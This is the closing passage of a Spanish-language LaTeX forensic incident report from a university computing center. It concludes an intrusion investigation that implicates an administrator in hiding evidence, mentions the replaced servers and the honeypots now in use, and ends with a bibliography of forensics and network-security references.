eliminaci'on de evidencia, el ocultamiento de alg'un tipo de informaci'on
referente al ataque sea cual fuere la naturaleza de este, y no haber
informado a las autoridades, en este caso el administrador demuestra el
deseo de que no se conociera y no se tomara acci'on alguna contra el
ataque por alguna obscura raz'on. Adem'as de que el acceso no
autorizado a la cuenta de yyyyy en la m'aquina del correo y su intento
fallido de convertirse en root son ya de por si claros. El
administrador del sistema es la 'unica persona autorizada a revisar
toda informaci'on que sea necesaria sin restricciones siempre y cuando 
la situaci'on lo amer'ite y de manera 'etica, y es
quien autoriza a terceros a revisar el sistema si es meritorio incluso
por mandato legal.

 Los servidores involucrados fueron reemplazados por otros desde el d'ia
en que se comenz'o el an'alisis {\em post mortem}. Hay que destacar que desde 
entonces no ha existido ning'un intento de acceso no autorizado a los equipos.
Esto es extra\~no en ataques externos que no pueden conocer las acciones 
sobre los equipos por los administradores.

Se mantienen funcionando {\em honey pots} que enga\~nan a los posibles
intrusos haci'endolos pensar que entran a un sistema limpio no a una trampa. 
De esta manera los intrusos no se enteran de que est'an siendo vigilados en un servidor
falso.   


Con este documento la Administraci'on y la Comisi'on del Centro de C'omputo del
Instituto de F'isica y Matem'aticas de la UMSNH cierra las
investigaciones sobre este caso, el cual tuvo una duraci'on de un m'inimo de 180
horas efectivas de trabajo de campo mas otras tantas de investigaci'on
documental.

\section*{Bibliograf'ia}

-- Trivardis, {\em Compromised OpenBSD 3.0 with SSH.}\\

-- Ph. Oechslin, {\em IP spoofing.}
S'ecurite des R'eseaux 2002.\\

-- CERT Cordination Center, {\em Harvesting information with grave-robber.}  
Carnegie Mellon University.\\

-- Pedersen, Sthepen. {\em Forensic Analysis of an unknown system.}\\

-- Brian Carrier, {\em Performing an autopsy examination on FFS and EXT2FS partition images.}\\

-- Richard Saferstein, {\em Criminalistics: An Introduction to Forensic Science.} 
Prentice-Hall, 2002.\\     

-- Eogan Casey, {\em Digital Evidence and computer Crime.}
Academic Press, 2000.\\
   
-- Cmdr. Dave Pettinari, {\em UNIX Investigations.}
Pueblo country Sheriff's Office.\\
   
-- E. Larry Lidz, {\em Forensic Vulnerability Discovery and Analysis.}
The University of Chicago.\\   

-- Chris Brenton, {\em Mastering Network Security.}
SYBEX Editors, 2000.\\
   
-- Stephen Northcut, Judy Novak, {\em Network Intrusion Detection.}
New Riders, SANS-GIAC, 2000. \\

-- Joel Scambray, Stuart McClure, George Kurtz, {\em Hacking Exposed.}
Osborne-Mc Graw Hill, 2001. \\



\end{document}








